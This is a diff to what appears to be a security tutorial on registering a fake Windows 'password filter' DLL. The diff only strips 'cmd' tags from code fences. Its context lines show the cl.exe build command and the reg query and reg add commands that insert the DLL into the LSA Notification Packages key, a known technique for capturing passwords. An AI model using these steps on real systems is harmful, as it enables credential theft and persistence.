@@ -98,13 +98,13 @@ EXPORTS
 
 Finally, to create our DLL we can compile those two as such:
 
-```cmd
+```
 cl.exe /W0 /D_USRDLL /D_WINDLL filter.cpp filter.def /MT /link /DLL /OUT:filter.dll
 ```
 
 Then, to register this fake "password filter" we need to change the `Notification Packages` entry in the `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa` registry key to contain the name of our DLL. But first, let's see the current value of the aforementioned entry:
 
-```cmd
+```
 reg query "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa" /v "Notification Packages" 
 
 HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa
@@ -114,7 +114,7 @@ We see that it holds the value `scecli`, and it is a `REG_MULTI_SZ` type, which 
 
 So to add our DLL to the `Notification Packages` entry, we must copy our `filter.dll` to `%windir%\System32\` and then execute:
 
-```cmd
+```
 reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa" /v "Notification Packages" /d "scecli"\0"filter" /t REG_MULTI_SZ /f
 ```
 
